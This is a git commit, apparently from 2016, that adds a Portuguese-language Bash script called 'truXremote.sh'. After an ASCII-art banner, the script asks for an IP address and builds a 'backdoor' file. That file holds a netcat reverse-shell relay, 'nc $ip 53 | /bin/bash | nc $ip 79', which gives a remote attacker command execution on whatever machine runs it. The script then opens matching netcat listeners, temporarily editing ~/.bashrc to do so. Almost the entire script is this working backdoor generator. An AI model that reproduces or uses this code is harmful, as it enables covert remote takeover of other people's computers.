5ce0c2052d448d99c33556c13db445fe7deec671
Derxs <derxshx11bx@gmail.com>
2016-09-26 21:57:53 -0300

    Add files via upload

---
+++ truXremote.sh
@@ -0,0 +1,50 @@
+#!/bin/bash
+clear
+echo "
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMM        MMMMMMMMMMMM
+MMMMMMMMMM            MMMMMMMMMM
+MMMMMMMMM              MMMMMMMMM
+MMMMMMMM                MMMMMMMM
+MMMMMMM                 MMMMMMMM
+MMMMMMM                  MMMMMMM
+MMMMMMM                  MMMMMMM
+MMMMMMM    MMM    MMM    MMMMMMM
+MMMMMMM   MMMMM   MMMM   MMMMMMM
+MMMMMMM   MMMMM   MMMM   MMMMMMM
+MMMMMMMM   MMMM M MMMM  MMMMMMMM
+MMVKMMMM        M        MMMMMMM
+MMMMMMMM       MMM      MMMMMMMM
+MMMMMMMMMMMM   MMM  MMMMMMMMMMMM
+MMMMMMMMMM MM       M  MMMMMMMMM
+MMMMMMMMMM  M M M M M MMMMMMMMMM
+MMMM  MMMMM MMMMMMMMM MMMMM   MM
+MMM    MMMM M MMMMM M MMMM    MM
+MMM    MMMM   M M M  MMMMM   MMM
+MMMM    MMMM         MMM      MM
+MMM       MMMM     MMMM       MM
+MMM         MMMMMMMM      M  MMM
+MMMM  MMM      MMM      MMMMMMMM
+MMMMMMMMMMM  MM       MMMMMMM  M
+MMM  MMMMMMM       MMMMMMMMM   M
+MM    MMM        MM            M
+MM            MMMM            MM
+MMM        MMMMMMMMMMMMM       M
+MM      MMMMMMMMMMMMMMMMMMM    M
+MMM   MMMMMMMMMMMMMMMMMMMMMM   M
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+"
+echo -n "[+] Digite o seu IP: "
+read ip
+echo -n "[+] Digite o nome para a backdoor: "
+read nome
+sudo echo "#!/bin/bash" >> $nome.sh
+sudo echo "nc $ip 53 | /bin/bash | nc $ip 79" >> $nome.sh
+sudo chmod 777 $nome.sh
+clear
+echo "[+] Backdoor criada com sucesso!"
+sleep 2
+sudo echo nc -l -n -p 79 -vv >> ~/.bashrc
+sudo gnome-terminal
+sudo sed -i '/nc -l -n -p 79/d' ~/.bashrc
+sudo nc -l -n -p 53 -vv
